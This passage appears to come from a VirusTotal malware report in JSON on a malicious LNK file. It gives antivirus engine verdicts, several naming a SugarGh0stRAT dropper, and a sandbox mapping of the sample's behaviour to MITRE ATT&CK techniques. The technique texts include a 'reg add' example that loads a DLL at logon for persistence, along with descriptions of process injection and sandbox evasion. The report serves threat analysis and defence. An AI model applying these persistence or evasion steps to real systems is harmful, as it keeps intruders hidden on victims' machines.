        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan Horse",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.119",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231129"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28363",
          "result": "a variant of Generik.UAUDZE",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.478",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231128"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.0NA103IL23",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "LNK:Agent-EW [Trj]",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Lnk.Dropper.SugarGh0stRAT-10014941-0",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.WinLNK.Agent.gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.LNK.Droid.2.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "LNK.S.Dropper.650178",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.LNK.Droid.2.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Win32.Trojan.Agent.Lcnw",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.LNK.Droid.2.Gen (B)",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan-Dropper:W32/Janicab.A",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.LNK.Droid.2.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.0NA103IL23",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.LNK.Droid.2.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/LnkDrop-B",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Suspicious LNK",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36939B:27.34130",
          "result": "Trojan.LNK.Droid.2.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231206"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=89)",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Dropper]/Win32.Agent.a",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Script.Ks.Malware.9344",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.151.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36239",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.LNK.Droid.2.Gen [many]",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231206"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.WinLNK.Agent.gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231207-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1701961235",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/Script.Obfuscated.SC192391",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "RAT/Sugarghost.b",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-07.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231203"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "Trojan.Link.Crafted",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zoner": {
          "category": "malicious",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": "Probably Heur.LNKScript",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.SuspectCRC",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "LNK/Dropper.C1A3!tr",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "LNK:Agent-EW [Trj]",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Ghostcript.A",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      },
      "sigma_analysis_stats": {
        "high": 4,
        "medium": 2,
        "critical": 0,
        "low": 4
      }
    },
    "type": "file",
    "id": "f3ea4611c72d57eabf381d5639c3c8d1840cb005ed811f3038410fb2e04978c1",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/f3ea4611c72d57eabf381d5639c3c8d1840cb005ed811f3038410fb2e04978c1"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates an autostart registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Very long cmdline option found, this is very uncommon (may be encrypted or packed)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "Windows shortcut file (LNK) starts blacklisted processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Enumerates the file system"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1010/",
                "id": "T1010",
                "name": "Application Window Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "System process connects to network (likely due to code injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes batch files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the program directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
